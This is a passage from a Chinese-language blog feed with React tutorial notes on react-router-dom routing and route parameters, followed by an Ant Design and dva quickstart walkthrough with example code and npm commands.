<p><strong>卸载第三方依赖包：</strong><br>把之前下载的<code>react-router</code>卸载掉，好用以上命令重新安装<code>react-router-dom</code>，参考博客<a href="https://blog.csdn.net/liu__520/article/details/52801139" target="_blank" rel="noopener">React-Native填坑之删除第三方开源组件的依赖包</a>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm uninstall react-router --save</div></pre></td></tr></table></figure></p>
<p>然后修改<code>src/index.js</code>，内容如下：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</div><div class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./components/App'</span>;</div><div class="line"><span class="keyword">import</span> ComponentList <span class="keyword">from</span> <span class="string">'./components/list'</span>;</div><div class="line"><span class="keyword">import</span> &#123; HashRouter, Route, Switch &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RouterApp</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            <span class="comment">// 这里替换了之前的index.js，变成了程序的入口</span></div><div class="line">            &lt;HashRouter&gt;</div><div class="line">                &#123;<span class="comment">/* Router 中只能有唯一的一个子元素 */</span>&#125;</div><div class="line">                &lt;Switch&gt;</div><div class="line">                    &#123;<span class="comment">/* App主页 */</span>&#125;</div><div class="line">                    &lt;Route exact path=<span class="string">"/"</span> component=&#123;App&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span> </div><div class="line">                    &#123;<span class="comment">/* ComponentList 列表页 */</span>&#125;</div><div class="line">                    &lt;Route exact path=<span class="string">"/list"</span> component=&#123;ComponentList&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></div><div class="line">                &lt;<span class="regexp">/Switch&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>HashRouter&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">RouterApp</span> /&gt;</span>, document.getElementById('root'));</span></div></pre></td></tr></table></figure></p>
<p>上述代码在<code>&lt;RouterApp /&gt;</code>组件中进行路由的绑定，取代了之前的<code>index.js</code>变成了程序的入口。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// src/components/list.js 中的 &lt;ComponentList /&gt; 组件如下</span></div><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这里是列表页&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>div&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentList;</div></pre></td></tr></table></figure>
<h2 id="Router相关概念"><a href="#Router相关概念" class="headerlink" title="Router相关概念"></a>Router相关概念</h2><p>React Router通过 Router 和 Route 两个组件完成路由功能，一个应用只需要一个Router实例，所有路由配置组件 Route 都定义为 Router 的子组件。<br>在WEB应用中，一般使用对 Router 进行包装的 <code>&lt;BrowserRouter /&gt;</code>或 <code>&lt;HashRouter /&gt;</code>两个组件。<code>&lt;BrowserRouter /&gt;</code>使用HTML5的 history API(pushState、replaceState等)实现应用的 UI 和 URL 同步。<code>&lt;HashRouter /&gt;</code>使用 URL 的 hash 实现 UI 和 URL 同步。</p>
<p><code>&lt;BrowserRouter /&gt;</code>创建的URL形如：<code>http://example.com/some/path</code><br><code>&lt;HashRouter /&gt;</code>创建的URL形如：<code>http://example.com/#/some/path</code><br>使用<code>&lt;BrowserRouter /&gt;</code>时，一般还需要对服务器进行配置，让服务器能正确地处理所有可能的 URL(尤其对单页面应用，要求服务器总是返回唯一的HTML页面)；而使用<code>&lt;HashRouter /&gt;</code>则不存在这个问题，因为hash部分地内容会被服务器自动忽略，真正有效地部分是hash之前的部分，而对单页应用这部分是固定的。</p>
<p>Router会创建一个history对象，history 用来跟踪 URL，当 URL 发生变化时，Router的后代组件会重新渲染。React Router中提供的其他组件可以通过 context 获取 history 对象，隐含说明了 React Router 中的其他组件必须作为 Router 组件的后代组件使用。<strong>Router 中只能有唯一的一个子元素。</strong></p>
<p><code>&lt;Route /&gt;</code>是React Router用于配置路由信息的组件，每当有一个组件需要根据URL决定是否渲染时，就需要创建一个<code>&lt;Route /&gt;</code>。上述路由管理两个页面，分别是<code>/</code>下的<code>&lt;App /&gt;</code>主页，和<code>/list/</code>下的<code>&lt;ComponentList /&gt;</code>列表页。 </p>
<h2 id="Router参数传递"><a href="#Router参数传递" class="headerlink" title="Router参数传递"></a>Router参数传递</h2><p>当URL和Route匹配时，Route会创建一个match对象作为props中的一个属性传递给被渲染的组件。利用match对象的<code>params</code>属性给Route的path传递参数。例如：<code>&lt;Route exact path=&quot;/list/:id&quot; component={ComponentList}&gt;&lt;/Route&gt;</code>包含一个参数id，<code>params</code>就是用于从匹配的URL中解析出path中的参数，例如当访问<code>http://example.com/list/1</code>时，<code>params={id:1}</code>。<br>index.js<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</div><div class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./components/App'</span>;</div><div class="line"><span class="keyword">import</span> ComponentList <span class="keyword">from</span> <span class="string">'./components/list'</span>;</div><div class="line"><span class="keyword">import</span> &#123; HashRouter, Route, Switch &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RouterApp</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            <span class="comment">// 这里替换了之前的index.js，变成了程序的入口</span></div><div class="line">            &lt;HashRouter&gt;</div><div class="line">                &#123;<span class="comment">/* Router 中只能有唯一的一个子元素 */</span>&#125;</div><div class="line">                &lt;Switch&gt;</div><div class="line">                    &#123;<span class="comment">/* App主页 */</span>&#125;</div><div class="line">                    &lt;Route exact path=<span class="string">"/"</span> component=&#123;App&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span> </div><div class="line">                    &#123;<span class="comment">/* ComponentList 列表页 */</span>&#125;</div><div class="line">                    &lt;Route exact path=<span class="string">"/list/:id"</span> component=&#123;ComponentList&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></div><div class="line">                &lt;<span class="regexp">/Switch&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>HashRouter&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">RouterApp</span> /&gt;</span>, document.getElementById('root'));</span></div></pre></td></tr></table></figure></p>
<p>list.js<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这里是列表页 &#123;<span class="keyword">this</span>.props.match.params.id&#125;&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>div&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentList;</div></pre></td></tr></table></figure></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/Route%E4%BC%A0%E5%8F%82.png" alt="Route传参"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;React实战项目news基础知识学习总结部分。&lt;br&gt;
    
    </summary>
    
      <category term="React" scheme="http://yoursite.com/categories/React/"/>
    
    
      <category term="antd" scheme="http://yoursite.com/tags/antd/"/>
    
      <category term="React" scheme="http://yoursite.com/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>Ant Design 入门学习总结</title>
    <link href="http://yoursite.com/2018/05/28/Ant-Design-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/05/28/Ant-Design-入门学习总结/</id>
    <published>2018-05-28T08:15:46.000Z</published>
    <updated>2018-05-28T08:22:40.762Z</updated>
    
    <content type="html"><![CDATA[<p>Ant Design of React 提供开箱即用的高质量 React 组件，具体的UI组件参见<a href="https://ant.design/docs/react/introduce-cn" target="_blank" rel="noopener">Ant Design 文档</a>。<br><a id="more"></a></p>
<h1 id="Ant-Design简介"><a href="#Ant-Design简介" class="headerlink" title="Ant Design简介"></a>Ant Design简介</h1><p><a href="https://ant.design/docs/react/introduce-cn" target="_blank" rel="noopener">Ant Design of React</a> 是 Ant Design 的 React 实现。<br>npm安装：<code>npm install antd --save</code></p>
<p><strong>按需加载：</strong> 使用 <a href="https://github.com/ant-design/babel-plugin-import" target="_blank" rel="noopener">babel-plugin-import</a>，babel-plugin-import 会帮助你加载 JS 和 CSS，只需从 antd 引入模块即可，无需单独引入样式。<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// .babelrc or babel-loader option</div><div class="line">&#123;</div><div class="line">  <span class="attr">"plugins"</span>: [</div><div class="line">    [<span class="string">"import"</span>, &#123; <span class="attr">"libraryName"</span>: <span class="string">"antd"</span>, <span class="attr">"libraryDirectory"</span>: <span class="string">"es"</span>, <span class="attr">"style"</span>: <span class="string">"css"</span> &#125;] // `style: <span class="literal">true</span>` 会加载 less 文件</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>使用示例：</strong><br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123; DatePicker &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</div><div class="line">ReactDOM.render(&lt;DatePicker /&gt;, mountNode);</div></pre></td></tr></table></figure></p>
<p><strong>快速上手：</strong><br>利用<a href="https://ant.design/docs/react/getting-started-cn" target="_blank" rel="noopener">antd-init</a>脚手架生成应用实例。(<strong>注意：</strong> antd-init只用于学习和体验antd如何使用，实际业务项目建议使用 dva-cli 和 create-react-app 进行搭建)<br><code>$ npm install antd-init -g</code> -&gt; <code>$ mkdir antd-demo &amp;&amp; cd antd-demo</code> -&gt; <code>$ antd-init</code><br>index.js<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</div><div class="line"><span class="keyword">import</span> &#123; LocaleProvider, DatePicker, message &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</div><div class="line"><span class="comment">// 由于 antd 组件的默认文案是英文，所以需要修改为中文</span></div><div class="line"><span class="keyword">import</span> zhCN <span class="keyword">from</span> <span class="string">'antd/lib/locale-provider/zh_CN'</span>;</div><div class="line"><span class="keyword">import</span> moment <span class="keyword">from</span> <span class="string">'moment'</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">'moment/locale/zh-cn'</span>;</div><div class="line"></div><div class="line">moment.locale(<span class="string">'zh-cn'</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(props) &#123;</div><div class="line">    <span class="keyword">super</span>(props);</div><div class="line">    <span class="keyword">this</span>.state = &#123;</div><div class="line">      date: <span class="string">''</span>,</div><div class="line">    &#125;;</div><div class="line">  &#125;</div><div class="line">  handleChange(date) &#123;</div><div class="line">    message.info(<span class="string">'您选择的日期是: '</span> + (date ? date.toString() : <span class="string">''</span>));</div><div class="line">    <span class="keyword">this</span>.setState(&#123; date &#125;);</div><div class="line">  &#125;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;LocaleProvider locale=&#123;zhCN&#125;&gt;</div><div class="line">        &lt;div style=&#123;&#123; <span class="attr">width</span>: <span class="number">400</span>, <span class="attr">margin</span>: <span class="string">'100px auto'</span> &#125;&#125;&gt;</div><div class="line">          &lt;DatePicker onChange=&#123;value =&gt; <span class="keyword">this</span>.handleChange(value)&#125; /&gt;</div><div class="line">          &lt;div style=&#123;&#123; <span class="attr">marginTop</span>: <span class="number">20</span> &#125;&#125;&gt;当前日期：&#123;<span class="keyword">this</span>.state.date &amp;&amp; <span class="keyword">this</span>.state.date.toString()&#125;&lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        &lt;/</span>div&gt;</div><div class="line">      &lt;<span class="regexp">/LocaleProvider&gt;</span></div><div class="line"><span class="regexp">    );</span></div><div class="line"><span class="regexp">  &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">ReactDOM.render(&lt;App /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</div></pre></td></tr></table></figure></p>
<p><code>$ npm start</code>, 访问<code>http://127.0.0.1:8000</code>UI样式如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/antd-init-demo/1.png" alt="1"><br><img src="http://ou3oh86t1.bkt.clouddn.com/antd-init-demo/2.png" alt="2"><br><img src="http://ou3oh86t1.bkt.clouddn.com/antd-init-demo/3.png" alt="3"></p>
<p><code>$ npm run build</code>，入口文件会构建到 dist 目录中，可以自由部署到不同环境中进行引用。</p>
<h1 id="项目实战-dva"><a href="#项目实战-dva" class="headerlink" title="项目实战 dva"></a>项目实战 dva</h1><p><a href="https://github.com/dvajs/dva" target="_blank" rel="noopener">dva</a> 是一个基于 React 和 Redux (Redux 或者 MobX 为数据应用框架) 的轻量应用框架，概念来自 elm，支持 side effects、热替换、动态加载、react-native、SSR 等，已在生产环境广泛应用。<br>Ant Design React 作为一个 UI 库，搭配 React 生态圈内的Redux，构建了轻量应用框架dva。<br>(1)<strong>安装dva-cli</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ npm install dva-cli -g</div><div class="line">$ dva -v</div><div class="line">dva-cli version 0.9.1</div></pre></td></tr></table></figure></p>
<p>(2)<strong>创建新应用</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ dva new dva-quickstart</div></pre></td></tr></table></figure></p>
<p>以上命令用于创建 <code>dva-quickstart</code> 目录，包含项目初始化目录和文件，并提供开发服务器、构建脚本、数据 mock 服务、代理服务器等功能。<br>接下来启动开发服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> dva-quickstart</div><div class="line">$ npm start</div></pre></td></tr></table></figure></p>
<p>在浏览器访问<code>http://localhost:8000</code> ，会看到 dva 的欢迎界面。<br>(3)<strong>使用antd</strong><br>通过 npm 安装 <code>antd</code> 和 <code>babel-plugin-import</code>(用来按需加载 antd 的脚本和样式，而不是把整个库都引入，从而提高性能) 。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cnpm install antd babel-plugin-import --save</div></pre></td></tr></table></figure></p>
<p><strong>注意：</strong> 一定要用cnpm，npm真的慢出天际。。。。<br>接下来编辑 <code>.webpackrc</code>，使 <code>babel-plugin-import</code> 插件生效:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">+  "extraBabelPlugins": [</div><div class="line">+    ["import", &#123; "libraryName": "antd", "libraryDirectory": "es", "style": "css" &#125;]</div><div class="line">+  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>(4)<strong>定义路由</strong><br>写个应用来显示产品列表。首先第一步是创建路由，路由可以想象成是组成应用的不同页面,<code>src/routes</code>下是存放页面的。<br>新建 route component  <code>src/routes/Products.js</code>，内容如下:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> Products = <span class="function">(<span class="params">props</span>) =&gt;</span> (</div><div class="line">  &lt;h2&gt;List <span class="keyword">of</span> Products&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">);</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">export default Products;</span></div></pre></td></tr></table></figure></p>
<p>添加路由信息到路由表，编辑 <code>router.js</code>(处理页面路由):<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+ <span class="keyword">import</span> Products <span class="keyword">from</span> <span class="string">'./routes/Products'</span>;</div><div class="line">...</div><div class="line">+ &lt;Route path="/products" exact component=&#123;Products&#125; /&gt;</div></pre></td></tr></table></figure></p>
<p>在浏览器里打开 <code>http://localhost:8000/#/products</code> ，能看到前面定义的 <code>&lt;h2&gt;</code> 标签。<br>(5)<strong>编写 UI Component</strong><br>编写一个 <code>ProductList</code> component。新建 <code>components/ProductList.js</code> 文件:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</div><div class="line"><span class="keyword">import</span> &#123; Table, Popconfirm, Button &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> ProductList = <span class="function">(<span class="params">&#123; onDelete, products &#125;</span>) =&gt;</span> &#123;</div><div class="line">  <span class="keyword">const</span> columns = [&#123;</div><div class="line">    title: <span class="string">'Name'</span>,</div><div class="line">    dataIndex: <span class="string">'name'</span>,</div><div class="line">  &#125;, &#123;</div><div class="line">    title: <span class="string">'Actions'</span>,</div><div class="line">    render: <span class="function">(<span class="params">text, record</span>) =&gt;</span> &#123;</div><div class="line">      <span class="keyword">return</span> (</div><div class="line">        &lt;Popconfirm title=<span class="string">"Delete?"</span> onConfirm=&#123;() =&gt; onDelete(record.id)&#125;&gt;</div><div class="line">          &lt;Button&gt;Delete&lt;<span class="regexp">/Button&gt;</span></div><div class="line"><span class="regexp">        &lt;/</span>Popconfirm&gt;</div><div class="line">      );</div><div class="line">    &#125;,</div><div class="line">  &#125;];</div><div class="line">  <span class="keyword">return</span> (</div><div class="line">    &lt;Table</div><div class="line">      dataSource=&#123;products&#125;</div><div class="line">      columns=&#123;columns&#125;</div><div class="line">    /&gt;</div><div class="line">  );</div><div class="line">&#125;;</div><div class="line"></div><div class="line">ProductList.propTypes = &#123;</div><div class="line">  onDelete: PropTypes.func.isRequired,</div><div class="line">  products: PropTypes.array.isRequired,</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ProductList;</div></pre></td></tr></table></figure></p>
<p>其中<code>&lt;Table /&gt;</code>的<code>columns</code>用于表格列的配置描述，类型<code>ColumnProps[]</code>。<a href="https://ant.design/components/table-cn/" target="_blank" rel="noopener">见文档</a><br>(6)<strong>定义 Model</strong><br>完成 UI 后，现在开始处理数据和逻辑。<br>dva 通过 model 的概念把一个领域的模型管理起来，包含同步更新 state 的 reducers，处理异步逻辑的 effects，订阅数据源的 subscriptions 。<br>新建 model <code>models/products.js</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</div><div class="line">  namespace: <span class="string">'products'</span>,</div><div class="line">  state: [],</div><div class="line">  reducers: &#123;</div><div class="line">    <span class="string">'delete'</span>(state, &#123; <span class="attr">payload</span>: id &#125;) &#123;</div><div class="line">      <span class="keyword">return</span> state.filter(<span class="function"><span class="params">item</span> =&gt;</span> item.id !== id);</div><div class="line">    &#125;,</div><div class="line">  &#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>上述 model 里：</p>
<ul>
<li><code>namespace</code> 表示在全局 state 上的 key</li>
<li><code>state</code> 是初始值，在这里是空数组</li>
<li><code>reducers</code> 等同于 redux 里的 reducer，接收 action，同步更新 state</li>
</ul>
<p>然后在<code>index.js</code>中载入：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 3. Model</span></div><div class="line">+ app.model(<span class="built_in">require</span>(<span class="string">'./models/products'</span>).default);</div></pre></td></tr></table></figure></p>
<p>(7)<strong>connect 起来</strong><br>将 model 和 component 串联起来。dva 提供了 connect 方法，类似于 react-redux 的 connect，用于将 model 和 component 串联起来。<br>编辑 <code>src/routes/Products.js</code>(页面展示组件)，替换为以下内容:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">'dva'</span>;</div><div class="line"><span class="keyword">import</span> ProductList <span class="keyword">from</span> <span class="string">'../components/ProductList'</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> Products = <span class="function">(<span class="params">&#123; dispatch, products &#125;</span>) =&gt;</span> &#123;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handleDelete</span>(<span class="params">id</span>) </span>&#123;</div><div class="line">    dispatch(&#123;</div><div class="line">      type: <span class="string">'products/delete'</span>,</div><div class="line">      payload: id,</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h2&gt;List <span class="keyword">of</span> Products&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">      &lt;ProductList onDelete=&#123;handleDelete&#125; products=&#123;products&#125; /</span>&gt;</div><div class="line">    &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">  );</span></div><div class="line"><span class="regexp">&#125;;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">/</span><span class="regexp">/ export default Products;</span></div><div class="line"><span class="regexp">export default connect((&#123; products &#125;) =&gt; (&#123;</span></div><div class="line"><span class="regexp">  products,</span></div><div class="line"><span class="regexp">&#125;))(Products);</span></div></pre></td></tr></table></figure></p>
<p>最后mock一些初始数据让此应用运行起来，编辑<code>index.js</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- <span class="keyword">const</span> app = dva();</div><div class="line">+ <span class="keyword">const</span> app = dva(&#123;</div><div class="line">+   initialState: &#123;</div><div class="line">+     products: [</div><div class="line">+       &#123; <span class="attr">name</span>: <span class="string">'dva'</span>, <span class="attr">id</span>: <span class="number">1</span> &#125;,</div><div class="line">+       &#123; <span class="attr">name</span>: <span class="string">'antd'</span>, <span class="attr">id</span>: <span class="number">2</span> &#125;,</div><div class="line">+     ],</div><div class="line">+   &#125;,</div><div class="line">+ &#125;);</div></pre></td></tr></table></figure></p>
<p>(8)<strong>构建应用</strong><br>完成开发并且在开发环境验证之后，接下来部署到生产环境：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm run build</div></pre></td></tr></table></figure></p>
<p>几秒后控制台输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ npm run build</div><div class="line"></div><div class="line">&gt; @ build C:\Users\Shirley\Desktop\dva-quickstart</div><div class="line">&gt; roadhog build</div><div class="line"></div><div class="line">Compiled successfully.</div><div class="line"></div><div class="line">File sizes after gzip:</div><div class="line"></div><div class="line">  145.28 KB  dist\index.js</div><div class="line">  17.84 KB   dist\index.css</div></pre></td></tr></table></figure></p>
<p><code>build</code> 命令会打包所有的资源，包含 JavaScript, CSS, web fonts, images, html 等，可以在 <code>dist/</code> 目录下找到这些文件。</p>
